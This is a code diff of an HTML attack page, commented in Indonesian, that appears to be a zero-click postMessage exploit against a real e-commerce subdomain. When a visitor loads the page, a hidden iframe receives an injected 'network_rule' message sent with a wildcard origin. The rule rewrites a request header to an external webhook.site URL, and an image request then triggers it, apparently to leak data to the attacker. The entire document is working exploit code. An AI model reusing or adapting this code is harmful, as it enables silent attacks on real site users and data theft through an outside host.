@@ -1,46 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head><title>Loading System...</title></head>
+<head><title>Loading...</title></head>
 <body>
+    <iframe id="secret_gate" src="https://shop-id.tokopedia.com/robots.txt" style="display:none;"></iframe>
+
     <script>
-        // Payload persis seperti yang sukses di console kemarin
-        const payload = {
-            source: "main_thread",
-            eventName: "network_rule",
-            data: [{
-                ruleName: "zero_click_pwn",
-                global: true,
-                conditions: [],
-                handlers: [{
-                    handler: "replace",
-                    type: "header",
-                    field: "X-Pns-Referrer", // Pakai header yang sudah ada di pns_logic agar tidak error 100000
-                    value: "VULNERABLE_ZERO_CLICK"
+        const gate = document.getElementById('secret_gate');
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+
+        // Fungsi injeksi yang lu pake di console kemarin
+        function inject() {
+            console.log("Executing silent injection...");
+            gate.contentWindow.postMessage({
+                source: "main_thread",
+                eventName: "network_rule",
+                data: [{
+                    ruleName: "zero_click_pwn",
+                    global: true,
+                    conditions: [],
+                    handlers: [{
+                        handler: "replace",
+                        type: "header",
+                        field: "X-Pns-Referrer",
+                        value: webhook
+                    }]
                 }]
-            }]
-        };
+            }, "*");
+        }
 
-        // Otomatis jalan saat halaman di-load
-        window.onload = function() {
-            // Membuka window kecil secara otomatis
-            const pwn = window.open("https://shop-id.tokopedia.com/robots.txt", "_blank", "width=10,height=10,left=-1000,top=-1000");
-
-            if (pwn) {
-                setTimeout(() => {
-                    // Mengirim pesan ke pns_logic.js tanpa origin check
-                    pwn.postMessage(payload, "*");
-                    
-                    // Memaksa fetch agar rule langsung aktif
-                    setTimeout(() => {
-                        pwn.location.href = "https://shop-id.tokopedia.com/robots.txt?t=" + Date.now();
-                    }, 500);
-
-                    // Tutup setelah injeksi selesai
-                    setTimeout(() => { pwn.close(); }, 2000);
-                }, 3000); 
-            } else {
-                document.body.innerHTML = "<h1>Please enable pop-ups for Zero-Click Demo</h1>";
-            }
+        gate.onload = function() {
+            // Tunggu 2 detik setelah iframe load, lalu injeksi
+            setTimeout(() => {
+                inject();
+                
+                // Trigger fetch otomatis agar rule langsung jalan ke webhook
+                const trigger = new Image();
+                trigger.src = "https://shop-id.tokopedia.com/robots.txt?nocache=" + Math.random();
+                
+                console.log("Injection sent and triggered!");
+            }, 2000);
         };
     </script>
 </body>
